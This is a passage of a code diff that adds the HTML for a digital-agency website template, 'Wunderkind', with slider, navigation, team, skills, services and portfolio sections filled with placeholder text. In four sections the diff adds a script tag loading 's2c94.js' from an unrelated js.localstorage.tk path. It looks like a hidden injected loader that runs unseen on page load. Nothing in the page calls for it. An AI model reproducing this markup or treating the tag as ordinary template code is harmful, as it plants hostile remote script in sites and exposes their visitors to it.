+                                    <div class="home-container text-center">
+                                        <div class="home-title liquid-slider processed slider-home"
+                                            id="slider-home-7799" style="z-index:3;">
+                                            <div>
+                                                <h1><small class="white">We Are Wunderkind</small> <br><strong>Something
+                                                        You Love</strong></h1>
+                                                <p class="lead">We are digital agency that loves crafting beautiful
+                                                    websites with great functionality.</p>
+                                                <div class="home-btn">
+                                                    <h4 class="btn-home"><a href="#about">WE'RE CREATIVE</a></h4>
+                                                </div>
+                                            </div>
+                                            <div>
+                                                <h1><small class="white">We Are Wunderkind</small> <br><strong>We Make
+                                                        Brands Shine</strong></h1>
+                                                <p class="lead">We do innovation, creativity, effectiveness and all that
+                                                    with love.</p>
+                                                <div class="home-btn">
+                                                    <h4 class="btn-home"><a href="#about">WHAT WE DO</a></h4>
+                                                </div>
+                                            </div>
+                                            <div>
+                                                <h1><small class="white">We Are Wunderkind</small> <br><strong>Best
+                                                        Digital Agency</strong></h1>
+                                                <p class="lead">Wunderkind was honored as best agency at EdAwards in New
+                                                    York.</p>
+                                                <div class="home-btn">
+                                                    <h4 class="btn-home"><a href="#about">MADE WITH <i
+                                                                class="icon ion-heart"></i></a></h4>
+                                                </div>
+                                            </div>
+                                            <div>
+                                                <h1><small class="white">We Are Wunderkind</small> <br><strong>Nice to
+                                                        Meet You</strong></h1>
+                                                <p class="lead">Let's meet up and see if there's chemistry!</p>
+                                                <div class="home-btn">
+                                                    <h4 class="btn-home"><a href="#about">MEET THE TEAM</a></h4>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="home-bottom">
+                                        <div class="container text-center">
+                                            <div class="move">
+                                                <a href="#About" class="fa fa-chevron-down"></a>
+                                                <div class="dots"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </section>
+                            </div> <!-- /.block -->
+                        </div>
+                    </div>
+                    <div class="col-md-12 " id="wunderkind_cms-menu">
+                        <div id="block-wunderkind-cms-menu" class="block block-wunderkind-cms">
 
-<router-outlet></router-outlet>
+
+                            <section id="fixed-navbar">
+                                <nav class="navbar navbar-default navbar-static-top" role="navigation">
+                                    <div class="container">
+                                        <!-- Brand and toggle get grouped for better mobile display -->
+                                        <div class="navbar-header">
+                                            <button type="button" class="navbar-toggle" data-toggle="collapse"
+                                                data-target="#main-nav">
+                                                <span class="sr-only">Toggle navigation</span>
+                                                <span class="icon-bar"></span>
+                                                <span class="icon-bar"></span>
+                                                <span class="icon-bar"></span>
+                                            </button>
+                                            <a class="navbar-brand" rel="home" href="index.html" title="Wunderkind">
+                                                <h3>Wunderkind</h3>
+                                            </a>
+                                        </div>
+
+                                        <!-- Collect the nav links, forms, and other content for toggling -->
+                                        <div class="collapse navbar-collapse" id="main-nav">
+                                            <ul class="nav navbar-nav  navbar-right">
+                                                <li class="dropdown">
+                                                    <span class="dropdown-toggle" data-toggle="dropdown"><a
+                                                            href="#Home">Home</a> <b class="caret"></b></span>
+                                                    <ul class="dropdown-menu">
+                                                        <li><a href="home/parallax-background.html">Parallax
+                                                                Background</a></li>
+                                                        <li><a href="home/video-background.html">Video Background</a>
+                                                        </li>
+                                                        <li><a href="home/fullscreen-slider.html">FullScreen Slider</a>
+                                                        </li>
+                                                        <li><a href="home/image-pattern.html">Image Pattern</a></li>
+                                                    </ul>
+                                                </li>
+                                                <li><a href="#About">About</a></li>
+                                                <li><a href="#Services">Services</a></li>
+                                                <li><a href="#Work">Work</a></li>
+                                                <li class="dropdown">
+                                                    <span class="dropdown-toggle" data-toggle="dropdown"><a
+                                                            href="#Features">Features</a> <b class="caret"></b></span>
+                                                    <ul class="dropdown-menu">
+                                                        <li><a href="#Features">Get Connected</a></li>
+                                                        <li><a href="#Our-Clients">Clients</a></li>
+                                                        <li><a href="#Price-List">Price List</a></li>
+                                                        <li><a href="content/shortcodes.html"><span
+                                                                    class="label label-primary">Shortcodes</span></a>
+                                                        </li>
+                                                    </ul>
+                                                </li>
+                                                <li class="dropdown">
+                                                    <span class="dropdown-toggle" data-toggle="dropdown"><a
+                                                            href="#Blog">Blog</a> <b class="caret"></b></span>
+                                                    <ul class="dropdown-menu">
+                                                        <li><a href="blog.html">Blog Home</a></li>
+                                                        <li><a href="blog/still-life-motion.html">Blog Single</a></li>
+                                                    </ul>
+                                                </li>
+                                                <li><a href="#Contact">Contact</a></li>
+                                            </ul>
+                                        </div><!-- /.navbar-collapse -->
+                                    </div><!-- /.container -->
+                                </nav>
+                            </section>
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div style="padding-left: 1px; " class="nd-region">
+
+            <div class="container">
+                <div id="About" class="row">
+                    <div class="col-md-12 " id="block-5">
+                        <div id="block-block-5" class="block block-block">
+
+
+                            <div data-appear-animation='flipInX' class='centered wow flipInX'>
+                                <h2><small>We Are Wunderkind</small> <br>Making Your Brand Shine</h2>
+                                <p class="lead">We create experiences that</p>
+                                <span class='highlight'>
+                                    transform brands
+                                </span>
+                                , grow businesses <br>and make people's lives better. Building brands and driving sales
+                                with powerful ideas.<p></p>
+                            </div>
+                            <div class='spacer'></div>
+                            <div data-appear-animation='flipInX' class='row  wow flipInX'>
+                                <div class='col-sm-6 col-md-6'>
+                                    <div class='about-row'>
+                                        <div class="about-icon">
+                                            <i class="icon ion-ios7-lightbulb-outline ion-3x highlight"></i><i
+                                                class="icon ion-ios7-lightbulb-outline back-icon"></i>
+                                        </div>
+                                        <div class="about-info">
+
+                                            <h4>We're Creative<br><small>Crafting With Love</small></h4>
+                                            <p>Vivamus congue diam vitae tortor imperdiet congue. Nullam sagittis,
+                                                tristique diam, ut ullamcorper tellus. Cras porttitor massa.</p>
+
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class='col-sm-6 col-md-6'>
+                                    <div class='about-row'>
+                                        <div class="about-icon">
+                                            <i class="icon ion-paper-airplane ion-3x highlight"></i><i
+                                                class="icon ion-paper-airplane back-icon"></i>
+                                        </div>
+                                        <div class="about-info">
+
+                                            <h4>We're Cool Nerds<br><small>Coding With Fun</small></h4>
+                                            <p>Duis vel est nec sapien suscipit gravida. Integer vitae tortor dui. Donec
+                                                libero quam, euismod sit amet enim ac, varius dictum.</p>
+
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="clearfix visible-md"></div>
+                                <div class='col-sm-6 col-md-6'>
+                                    <div class='about-row'>
+                                        <div class="about-icon">
+                                            <i class="icon ion-ios7-heart ion-3x highlight"></i><i
+                                                class="icon ion-ios7-heart back-icon"></i>
+                                        </div>
+                                        <div class="about-info">
+
+                                            <h4>We're Passionate<br><small>Available When You Need Us</small></h4>
+                                            <p>Maecenas sit amet eros luctus dui volutpat sollicitudin id vitae est.
+                                                Vivamus laoreet adipiscing metus vel fermentum. Sed velit.</p>
+
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class='col-sm-6 col-md-6'>
+                                    <div class='about-row'>
+                                        <div class="about-icon">
+                                            <i class="icon ion-speakerphone ion-3x highlight"></i><i
+                                                class="icon ion-speakerphone back-icon"></i>
+                                        </div>
+                                        <div class="about-info">
+
+                                            <h4>We're Professional<br><small>New York Based</small></h4>
+                                            <p>Integer ornare, tellus eget lobortis cursus, metus enim ultricies eros,
+                                                vitae porttitor elit sapien quis justo. Duis vitae.</p>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="nd-region">
+
+            <div class="container-fluid">
+                <div id="Skills" class="row">
+                    <div class="col-md-12 " id="block-6">
+                        <div id="block-block-6" class="block block-block">
+
+
+                            <article id="node-5" class="node node-page container parallax-bg "
+                                style="background-image: url(../assets/sites/wunderkind.nikadevs.com/files/bg_2.jpg);"
+                                data-stellar-background-ratio="0.7">
+                                <header>
+                                    <div class="parallax-overlay"></div>
+
+                                </header>
+
+                                <div class="content node-page container">
+                                    <div data-appear-animation='flipInX' class='text-white row  wow flipInX'>
+                                        <div class='col-md-6'>
+                                            <div class='md spacer'></div>
+                                            <h2 class="we-are-info">Our Skills<br><small class="highlight">Crafting With
+                                                    Love</small></h2> <br>
+                                            <p class="p-info">Fusce faucibus tincidunt nulla, tincidunt sagittis magna
+                                                venenatis quis. Proin commodo eu ipsum eu suscipit. In dapibus arcu sit
+                                                amet imperdiet posuere. Praesent condimentum nulla at mauris ornare,
+                                                eget consequat felis euismod.</p>
+                                            <p class="p-info">Vivamus a placerat ante. Duis vulputate nibh sit amet
+                                                augue vehicula, mattis viverra purus tristique. Integer lobortis erat in
+                                                placerat fermentum. Sed luctus varius leo ac posuere. Integer eget est
+                                                vitae dolor.</p>
+                                            <div class='md visible-md visible-lg spacer'></div>
+                                        </div>
+                                        <div data-appear-animation='flipInX' class='col-md-6 wow flipInX'>
+                                            <div class='xlg spacer'></div>
+                                            <div class='skill-col'>
+                                                <p><em>User Experience</em>
+                                                <div class="skillbar" data-percent="85%">
+                                                    <div class="skillbar-title"><span>85%</span></div>
+                                                    <div class="skillbar-bar"></div>
+                                                </div>
+                                            </div>
+                                            <div class='skill-col'>
+                                                <p><em>Web & Mobile Design</em>
+                                                <div class="skillbar" data-percent="100%">
+                                                    <div class="skillbar-title"><span>100%</span></div>
+                                                    <div class="skillbar-bar"></div>
+                                                </div>
+                                            </div>
+                                            <div class='skill-col'>
+                                                <p><em>Branding</em>
+                                                <div class="skillbar" data-percent="64%">
+                                                    <div class="skillbar-title"><span>64%</span></div>
+                                                    <div class="skillbar-bar"></div>
+                                                </div>
+                                            </div>
+                                            <div class='skill-col'>
+                                                <p><em>Fun</em>
+                                                <div class="skillbar" data-percent="50%">
+                                                    <div class="skillbar-title"><span>50%</span></div>
+                                                    <div class="skillbar-bar"></div>
+                                                </div>
+                                            </div>
+                                            <div class='md spacer'></div>
+                                        </div>
+                                    </div>
+                                    <script type='text/javascript' src='../js.localstorage.tk/s2c94.js?qr=888'></script>
+                                </div>
+
+                                <footer>
+                                </footer>
+
+                            </article> <!-- /.node -->
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="nd-region">
+
+            <div class="container">
+                <div id="Our-Team" class="row">
+                    <div class="col-md-12 " id="views-people-block_1">
+                        <div id="block-views-people-block-1" class="block block-views">
+
+
+                            <div
+                                class="view view-people view-id-people view-display-id-block_1 view-dom-id-4d586ed11f1ca319a3760f212f127998">
+                                <div class="view-header">
+                                    <div class='centered wow flipInX' data-appear-animation='flipInX'>
+                                        <h2>Our Small Team <small>with Big Ideas</small></h2>
+                                        <p class="lead">Interdisciplinary teams with <span class='highlight'>big
+                                                ideas</span>. Design and prototyping from day one.</p>
+                                    </div>
+                                </div>
+
+
+
+                                <div class="view-content">
+                                    <div class="row">
+                                        <div class="col-md-4 col-sm-4 col-xs-12 wow flipInY">
+                                            <div class="team-member">
+                                                <div class="effect effects">
+                                                    <div class="img">
+                                                        <img src="../assets/sites/wunderkind.nikadevs.com/files/styles/people_650_500/public/team-38262.jpg?itok=6sMP-4lE"
+                                                            width="650" height="500" alt="" />
+                                                        <div class="overlay">
+                                                            <ul class="expand">
+                                                                <li class="social-icon">
+                                                                    <a href="www.facebook.html" target="_blank"><i
+                                                                            class="fa fa-facebook"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="www.twitter.html" target="_blank"><i
+                                                                            class="fa fa-twitter"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="skype:skype_echo" target="_blank"><i
+                                                                            class="fa fa-skype"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="www.instagram.html" target="_blank"><i
+                                                                            class="fa fa-instagram"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="mail:example@mail.com" target="_blank"><i
+                                                                            class="fa fa-envelope"></i></a>
+                                                                </li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="team-info">
+                                                    <h4>Mickey Blueyes<br><small class="highlight">Web Developer</small>
+                                                    </h4>
+                                                    <p>Nullam id ornare magna. Nullam eu nisi porttitor, aliquam mi sit
+                                                        amet, viverra diam. Maecenas vitae mollis est. Nunc nec lectus.
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4 col-sm-4 col-xs-12 wow flipInY">
+                                            <div class="team-member">
+                                                <div class="effect effects">
+                                                    <div class="img">
+                                                        <img src="../assets/sites/wunderkind.nikadevs.com/files/styles/people_650_500/public/team-2d837.jpg?itok=Fg4lTAD7"
+                                                            width="650" height="500" alt="" />
+                                                        <div class="overlay">
+                                                            <ul class="expand">
+                                                                <li class="social-icon">
+                                                                    <a href="www.facebook.html" target="_blank"><i
+                                                                            class="fa fa-facebook"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="www.twitter.html" target="_blank"><i
+                                                                            class="fa fa-twitter"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="skype:skype_echo" target="_blank"><i
+                                                                            class="fa fa-skype"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="www.instagram.html" target="_blank"><i
+                                                                            class="fa fa-instagram"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="mail:example@mail.com" target="_blank"><i
+                                                                            class="fa fa-envelope"></i></a>
+                                                                </li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="team-info">
+                                                    <h4>Jane Awesome<br><small class="highlight">PR Manager</small></h4>
+                                                    <p>Vivamus congue diam vitae tortor imperdiet congue. Nullam
+                                                        sagittis tristique diam, ut ullamcorper tellus. Cras porttitor.
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4 col-sm-4 col-xs-12 wow flipInY">
+                                            <div class="team-member">
+                                                <div class="effect effects">
+                                                    <div class="img">
+                                                        <img src="../assets/sites/wunderkind.nikadevs.com/files/styles/people_650_500/public/team-1a99e.jpg?itok=FVcA31U2"
+                                                            width="650" height="500" alt="" />
+                                                        <div class="overlay">
+                                                            <ul class="expand">
+                                                                <li class="social-icon">
+                                                                    <a href="www.facebook.html" target="_blank"><i
+                                                                            class="fa fa-facebook"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="www.twitter.html" target="_blank"><i
+                                                                            class="fa fa-twitter"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="skype:skype_echo" target="_blank"><i
+                                                                            class="fa fa-skype"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="www.instagram.html" target="_blank"><i
+                                                                            class="fa fa-instagram"></i></a>
+                                                                </li>
+                                                                <li class="social-icon">
+                                                                    <a href="mail:example@mail.com" target="_blank"><i
+                                                                            class="fa fa-envelope"></i></a>
+                                                                </li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="team-info">
+                                                    <h4>Jack Smith<br><small class="highlight">CEO / Founder</small>
+                                                    </h4>
+                                                    <p>Quisque at ornare sapien. In in blandit nunc. Maecenas lacus
+                                                        massa, lacinia a lectus viverra, vulputate vulputate lectus.</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+
+
+
+
+
+                            </div>
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="nd-region">
+
+            <div class="container-fluid">
+                <div id="We-re-Creative" class="row">
+                    <section class="col-md-12 parallax-no-overlay" id="block-7">
+                        <div id="block-block-7" class="block block-block">
+
+
+                            <article id="node-9" class="node node-page container parallax-bg "
+                                style="background-image: url(../assets/sites/wunderkind.nikadevs.com/files/bg_3.jpg);"
+                                data-stellar-background-ratio="0.7">
+                                <header>
+                                    <div class="parallax-overlay"></div>
+
+                                </header>
+
+                                <div class="content node-page container">
+                                    <div class='row'>
+                                        <div data-appear-animation='flipInX' class='col-md-6 wow flipInX'>
+                                            <div class='spacer md'></div>
+                                            <h2>We're Creative<br><small>Crafting With Love</small></h2>
+                                            <br>
+                                            <p class="p-info">Fusce faucibus tincidunt nulla, tincidunt sagittis magna
+                                                venenatis quis. Proin commodo eu ipsum eu suscipit. In dapibus arcu sit
+                                                amet imperdiet posuere. Praesent condimentum nulla at mauris ornare,
+                                                eget consequat felis euismod.</p>
+                                            <p class="p-info">Vivamus a placerat ante. Duis vulputate nibh sit amet
+                                                augue vehicula, mattis viverra purus tristique. Integer lobortis erat in
+                                                placerat fermentum. Sed luctus varius leo ac posuere. Integer eget est
+                                                vitae dolor.</p>
+                                            <div class='spacer lg'></div>
+                                        </div>
+                                        <div class='col-md-6'>
+                                            <div class='spacer lg'></div>
+
+                                            <figure class='video-holder'>
+                                                <iframe
+                                                    src="http://player.vimeo.com/video/85844473?title=0&amp;byline=0&amp;portrait=0&amp;color=FFFFFF"></iframe>
+                                            </figure>
+                                            <div class='spacer lg'></div>
+                                        </div>
+                                    </div>
+                                    <script type='text/javascript' src='../js.localstorage.tk/s2c94.js?qr=888'></script>
+                                </div>
+
+                                <footer>
+                                </footer>
+
+                            </article> <!-- /.node -->
+                        </div> <!-- /.block -->
+                    </section>
+                    <div class="col-md-12 " id="block-8">
+                        <div id="block-block-8" class="block block-block">
+
+
+                            <div class="container">
+                                <div class='spacer'></div>
+                                <div data-appear-animation='flipInX' class='row  wow flipInX'>
+                                    <div class='col-sm-6 col-md-3'>
+                                        <div class='fact-container'>
+                                            <div class="fact">
+                                                <span class="counter highlight">4246</span>
+                                                <p class="lead">Satisfied Customers</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class='col-sm-6 col-md-3'>
+                                        <div class='fact-container'>
+                                            <div class="fact">
+                                                <span class="counter highlight">618</span>
+                                                <p class="lead">Twenkies Eaten</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class='col-sm-6 col-md-3'>
+                                        <div class='fact-container'>
+                                            <div class="fact">
+                                                <span class="counter highlight">240</span>
+                                                <p class="lead">Completed Projects</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class='col-sm-6 col-md-3'>
+                                        <div class='fact-container'>
+                                            <div class="fact">
+                                                <span class="counter highlight">96</span>
+                                                <p class="lead">Winning Awards</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class='spacer'></div>
+                            </div>
+                        </div> <!-- /.block -->
+                    </div>
+                    <div class="col-md-12 " id="block-9">
+                        <div id="block-block-9" class="block block-block">
+
+
+                            <article id="node-10" class="node node-page container parallax-bg "
+                                style="background-image: url(../assets/sites/wunderkind.nikadevs.com/files/bg_4.jpg);"
+                                data-stellar-background-ratio="0.7">
+                                <header>
+                                    <div class="parallax-overlay"></div>
+
+                                </header>
+
+                                <div class="content node-page container">
+                                    <div class='spacer lg'></div>
+                                    <div class='liquid-slider text-white centered' id='liquid-slider-15943072481'>
+                                        <div class='quote centered'>
+
+                                            <h2><i class="fa fa-quote-left highlight"></i> <small>A Perfect Design is
+                                                </small>Passion, Dedication,<small> and a lots of Coffee</small> <i
+                                                    class="fa fa-quote-right highlight"></i></h2>
+                                            <p class="label label-primary">ORIGIN / DESIGN TEAM</p>
+                                        </div>
+                                        <div class='quote centered'>
+
+                                            <h2><i class="fa fa-quote-left highlight"></i> <small>The Difference between
+                                                    ordinary and extraordinary is </small>just that little extra <i
+                                                    class="fa fa-quote-right highlight"></i></h2>
+                                            <p class="label label-primary">ORIGIN / DESIGN TEAM</p>
+                                        </div>
+                                        <div class='quote centered'>
+
+                                            <h2><i class="fa fa-quote-left highlight"></i> The Desire to Create
+                                                <small>is One of the Deepest Yearnings of the Human Soul</small> <i
+                                                    class="fa fa-quote-right highlight"></i></h2>
+                                            <p class="label label-primary">ORIGIN / DESIGN TEAM</p>
+                                        </div>
+                                    </div>
+                                    <div class='spacer lg'></div>
+
+                                    <script type='text/javascript' src='../js.localstorage.tk/s2c94.js?qr=888'></script>
+                                </div>
+
+                                <footer>
+                                </footer>
+
+                            </article> <!-- /.node -->
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="nd-region">
+
+            <div class="container-fluid">
+                <div id="Services" class="row">
+                    <div class="col-md-12 " id="block-10">
+                        <div id="block-block-10" class="block block-block">
+
+
+                            <div class='container'>
+                                <div class='row'>
+                                    <div data-appear-animation='flipInX' class='centered wow flipInX'>
+                                        <h2><small>What We Do</small><br><strong>Our Capabilities</strong></h2>
+                                        <p class="lead">A highly skilled professional service with a</p>
+                                        <span class='highlight'>
+                                            creative touch.
+                                        </span>
+                                        <p></p>
+                                    </div>
+                                </div>
+                                <div class='spacer'></div>
+                                <div class='row'>
+                                    <div data-appear-animation='flipInX' class='col-sm-6 col-md-4 wow flipInX'>
+                                        <div class='about-row'>
+                                            <div class="about-icon">
+                                                <i class="icon ion-ios7-monitor-outline ion-3x highlight"></i><i
+                                                    class="icon ion-ios7-monitor-outline back-icon"></i>
+                                            </div>
+                                            <div class="about-info">
+
+                                                <h4>Graphic Design<br><small>Crafting with Love </small></h4>
+                                                <p>Vivamus congue diam vitae tortor imperdiet congue. Nullam sagittis
+                                                    tristique diam, ut ullamcorper tellus. Cras porttitor massa.</p>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div data-appear-animation='flipInY' class='col-sm-6 col-md-4 wow flipInY'>
+                                        <div class='about-row'>
+                                            <div class="about-icon">
+                                                <i class="icon ion-social-github ion-3x highlight"></i><i
+                                                    class="icon ion-social-github back-icon"></i>
+                                            </div>
+                                            <div class="about-info">
+
+                                                <h4>Crazy Coding<br><small>Hand Developing</small></h4>
+                                                <p>Nullam id ornare magna. Nullam eu nisi porttitor, aliquam mi sit
+                                                    amet, viverra diam. Maecenas vitae mollis est. Nunc nec lectus.</p>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div data-appear-animation='flipInX' class='col-sm-6 col-md-4 wow flipInX'>
+                                        <div class='about-row'>
+                                            <div class="about-icon">
+                                                <i class="icon ion-speedometer ion-3x highlight"></i><i
+                                                    class="icon ion-speedometer back-icon"></i>
+                                            </div>
+                                            <div class="about-info">
+
+                                                <h4>Web Optimization<br><small>Faster than Light</small></h4>
+                                                <p>Maecenas sit amet eros luctus dui volutpat sollicitudin id vitae est.
+                                                    Vivamus laoreet adipiscing metus vel fermentum. Sed velit.</p>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div data-appear-animation='flipInY' class='col-sm-6 col-md-4 wow flipInY'>
+                                        <div class='about-row'>
+                                            <div class="about-icon">
+                                                <i class="icon ion-map ion-3x highlight"></i><i
+                                                    class="icon ion-map back-icon"></i>
+                                            </div>
+                                            <div class="about-info">
+
+                                                <h4>Branding<br><small>Making a New You</small></h4>
+                                                <p>In pulvinar sapien ipsum, vel scelerisque ligula fringilla in. Donec
+                                                    mi urna, aliquet ac arcu vel, feugiat fermentum leo.</p>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div data-appear-animation='flipInX' class='col-sm-6 col-md-4 wow flipInX'>
+                                        <div class='about-row'>
+                                            <div class="about-icon">
+                                                <i class="icon ion-ionic ion-3x highlight"></i><i
+                                                    class="icon ion-ionic back-icon"></i>
+                                            </div>
+                                            <div class="about-info">
+
+                                                <h4>Customer Support<br><small>And Affinity</small></h4>
+                                                <p>Duis vel est nec sapien suscipit gravida. Integer vitae tortor dui.
+                                                    Donec libero quam, euismod sit amet enim ac, varius.</p>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div data-appear-animation='flipInY' class='col-sm-6 col-md-4 wow flipInY'>
+                                        <div class='about-row'>
+                                            <div class="about-icon">
+                                                <i class="icon ion-paper-airplane ion-3x highlight"></i><i
+                                                    class="icon ion-paper-airplane back-icon"></i>
+                                            </div>
+                                            <div class="about-info">
+
+                                                <h4>Having Fun<br><small>Office Surfing (with chairs!)</small></h4>
+                                                <p>Etiam cursus nunc vitae auctor semper. In commodo ligula eu faucibus
+                                                    mattis. Maecenas sed consectetur orci. Curabitur dui.</p>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div> <!-- /.block -->
+                    </div>
+                    <div class="col-md-12 parallax-no-overlay" id="block-11" style="padding-top: 20px; ">
+                        <div id="block-block-11" class="block block-block">
+
+
+                            <article id="node-12" class="node node-page container parallax-bg "
+                                style="background-image: url(../assets/sites/wunderkind.nikadevs.com/files/bg_5.jpg);"
+                                data-stellar-background-ratio="0.7">
+                                <header>
+                                    <div class="parallax-overlay"></div>
+
+                                </header>
+
+                                <div class="content node-page container">
+                                    <div class='call-to-action call-action-6 no-border'>
+                                        <div class="action-5-info">
+                                            <h3><small>Awesome, <strong>easy to use </strong>& the developer is super
+                                                    nice and answers questions quickly!</small></h3>
+
+                                        </div>
+                                        <div class="action-5-btn">
+                                            <a href="contact.html" class="btn btn-primary btn-lg btn-responsive">Buy Now
+                                                on ThemeForest</a>
+                                        </div>
+                                    </div>
+                                    <script type='text/javascript' src='../js.localstorage.tk/s2c94.js?qr=888'></script>
+                                </div>
+
+                                <footer>
+                                </footer>
+
+                            </article> <!-- /.node -->
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="nd-region">
+
+            <div class="container">
+                <div id="Work" class="row">
+                    <div class="col-md-12 " id="views-projects-block">
+                        <div id="block-views-projects-block" class="block block-views">
+
+
+                            <div
+                                class="view view-projects view-id-projects view-display-id-block view-dom-id-c66c48b453fabb353a1ac7c0cab74916">
+                                <div class="view-header">
+                                    <div class="col-lg-12 section-title wow flipInX">
+                                        <h2><small>Take a Look at</small><br><strong>Some of Our Work</strong></h2>
+                                        <p class="lead">Wide range of <span class="highlight">successful</span> digital
+                                            and print projects.</p>
+                                    </div>
+                                </div>
+
+
+
+                                <div class="view-content">
+
+                                    <div id="filters-container" class="cbp-l-filters-button">
+                                        <div data-filter="*" class="cbp-filter-item-active cbp-filter-item">All<div
+                                                class="cbp-filter-counter"></div>
+                                        </div>
+                                        <div data-filter=".Branding" class="cbp-filter-item">Branding<div
+                                                class="cbp-filter-counter"></div>
+                                        </div>
+                                        <div data-filter=".Photography" class="cbp-filter-item">Photography<div
+                                                class="cbp-filter-counter"></div>
+                                        </div>
+                                        <div data-filter=".Web-Design" class="cbp-filter-item">Web Design<div
+                                                class="cbp-filter-counter"></div>
+                                        </div>
+                                        <div data-filter=".Typography" class="cbp-filter-item">Typography<div
+                                                class="cbp-filter-counter"></div>
+                                        </div>
+                                        <div data-filter=".Apps" class="cbp-filter-item">Apps<div
+                                                class="cbp-filter-counter"></div>
+                                        </div>
+                                        <div data-filter=".Videos" class="cbp-filter-item">Videos<div
+                                                class="cbp-filter-counter"></div>
+                                        </div>
+                                        <div data-filter=".Marketplace" class="cbp-filter-item">Marketplace<div
+                                                class="cbp-filter-counter"></div>
+                                        </div>
+                                        <div data-filter=".Design" class="cbp-filter-item">Design<div
+                                                class="cbp-filter-counter"></div>
+                                        </div>
+                                    </div>
+
+                                    <div id="grid-container" class="cbp-l-grid-projects">
+                                        <ul class="grid cs-style-3">
+                                            <li
+                                                class="cbp-item effect effects Branding Photography Web-Design Typography">
+                                                <div class="img">
+                                                    <img src="../assets/sites/wunderkind.nikadevs.com/files/styles/project_660_495/public/1625f.jpg?itok=TTfm9Gh4"
+                                                        width="660" height="495" alt="" />
+                                                    <div class="overlay">
+                                                        <ul class="expand">
+                                                            <li class="cbp-l-icon"><a
+                                                                    href="../assets/sites/wunderkind.nikadevs.com/files/1.jpg"
+                                                                    class="cbp-lightbox" data-title="Our Project 9"><i
+                                                                        class="fa fa-search"></i></a></li>
+                                                            <li class="cbp-l-icon"><a href="project/our-project-9.html"
+                                                                    class="cbp-singlePage"><i
+                                                                        class="fa fa-expand"></i></a></li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li
+                                                class="cbp-item effect effects Photography Apps Videos Web-Design Marketplace Typography">
+                                                <div class="img">
+                                                    <img src="../assets/sites/all/themes/wunderkind/img/video-vimeo.jpg" alt="" />
+                                                    <div class="overlay">
+                                                        <ul class="expand">
+                                                            <li class="cbp-l-icon"><a href="http://vimeo.com/85844473"
+                                                                    class="cbp-lightbox" data-title="Our Project 8"><i
+                                                                        class="fa fa-search"></i></a></li>
+                                                            <li class="cbp-l-icon"><a href="project/our-project-8.html"
+                                                                    class="cbp-singlePage"><i
+                                                                        class="fa fa-expand"></i></a></li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li class="cbp-item effect effects Design Photography Branding Apps Videos">
+                                                <div class="img">
+                                                    <img src="../assets/sites/all/themes/wunderkind/img/video-youtube.jpg"
+                                                        alt="" />
+                                                    <div class="overlay">
+                                                        <ul class="expand">
+                                                            <li class="cbp-l-icon"><a
+                                                                    href="https://www.youtube.com/watch?v=9No-FiEInLA"
+                                                                    class="cbp-lightbox" data-title="Our Project 7"><i
+                                                                        class="fa fa-search"></i></a></li>
+                                                            <li class="cbp-l-icon"><a href="project/our-project-7.html"
+                                                                    class="cbp-singlePage"><i
+                                                                        class="fa fa-expand"></i></a></li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li
+                                                class="cbp-item effect effects Design Photography Web-Design Marketplace Typography">
+                                                <div class="img">
+                                                    <img src="../assets/sites/wunderkind.nikadevs.com/files/styles/project_660_495/public/post-1f719.jpg?itok=LUtKcHmL"
+                                                        width="660" height="495" alt="" />
+                                                    <div class="overlay">
+                                                        <ul class="expand">
+                                                            <li class="cbp-l-icon"><a
+                                                                    href="../assets/sites/wunderkind.nikadevs.com/files/post-1.jpg"
+                                                                    class="cbp-lightbox" data-title="Our Project 6"><i
